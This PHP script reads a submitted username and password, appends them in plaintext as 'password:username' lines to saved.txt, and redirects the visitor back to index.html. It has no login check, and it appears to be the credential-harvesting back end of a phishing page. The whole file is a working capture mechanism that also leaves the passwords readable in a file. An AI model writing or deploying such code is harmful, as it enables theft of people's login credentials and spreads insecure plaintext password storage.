<?php
// Get the username and password from the POST request
$username = $_POST['username'];
$password = $_POST['password'];

// Format the data as "password:username" followed by a new line
$data = $password . ":" . $username . "\n";

// Define the path to the file where the data will be saved
$file = 'saved.txt';

// Append the data to the file
file_put_contents($file, $data, FILE_APPEND);

// Redirect back to the login page (or any other page)
header('Location: index.html');
exit;
?>
